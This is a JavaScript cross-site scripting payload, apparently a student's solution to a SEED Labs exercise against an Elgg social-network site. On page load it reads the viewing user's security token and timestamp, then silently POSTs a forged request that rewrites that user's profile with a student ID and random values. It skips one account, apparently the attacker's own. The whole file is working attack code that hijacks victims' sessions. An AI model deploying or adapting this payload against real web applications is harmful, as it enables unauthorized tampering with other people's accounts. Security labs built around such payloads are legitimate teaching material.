<script type="text/javascript">
    function generateRandomString(length) {
        var result = '';
        var characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
        var charactersLength = characters.length;
        for (var i = 0; i < length; i++) {
            result += characters.charAt(Math.floor(Math.random() * charactersLength));
        }
        return result;
    }


    window.onload = function(){
	//JavaScript code to access user name, user guid, Time Stamp __elgg_ts
	//and Security Token __elgg_token
	var ts="&__elgg_ts="+elgg.security.token.__elgg_ts;
	var token="&__elgg_token="+elgg.security.token.__elgg_token;
	//Construct the content of your url.
    var sendurl="http://www.seed-server.com/action/profile/edit"; //FILL IN
	var content= token+ts +
    "&name="+ elgg.session.user.name +
    "&description=" + "1905105" +// Student ID for description
    "&accesslevel%5Bdescription%5D=1" +
    "&briefdescription=" + generateRandomString(8) +
    "&accesslevel%5Bbriefdescription%5D=1" +
    "&location=" +generateRandomString(8) + 
    "&accesslevel%5Blocation%5D=1" +
    "&interests="+ generateRandomString(8) +
    "&accesslevel%5Binterests%5D=1" +
    "&skills="+ generateRandomString(8) +
    "&accesslevel%5Bskills%5D=1" +
    "&contactemail="+generateRandomString(8)+"@gmail.com" +
    "&accesslevel%5Bcontactemail%5D=1" +
    "&phone="+ generateRandomString(8) +
    "&accesslevel%5Bphone%5D=1" +
    "&mobile="+ generateRandomString(8) +
    "&accesslevel%5Bmobile%5D=1" +
    "&website=http://"+generateRandomString(8)+".com" +
    "&accesslevel%5Bwebsite%5D=1" +
    "&twitter="+ generateRandomString(8) +
    "&accesslevel%5Btwitter%5D=1" +
    "&guid=" + elgg.session.user.guid; //FILL IN
	
	if(elgg.session.user.guid != 59)
	{
		//Create and send Ajax request to modify profile
		var Ajax=null;
		Ajax=new XMLHttpRequest();
		Ajax.open("POST",sendurl,true);
		Ajax.setRequestHeader("Host","www.seed-server.com");
		Ajax.setRequestHeader("Content-Type",
		"application/x-www-form-urlencoded");
		Ajax.send(content);
        console.log(Ajax.responseText);
	}
}
</script>
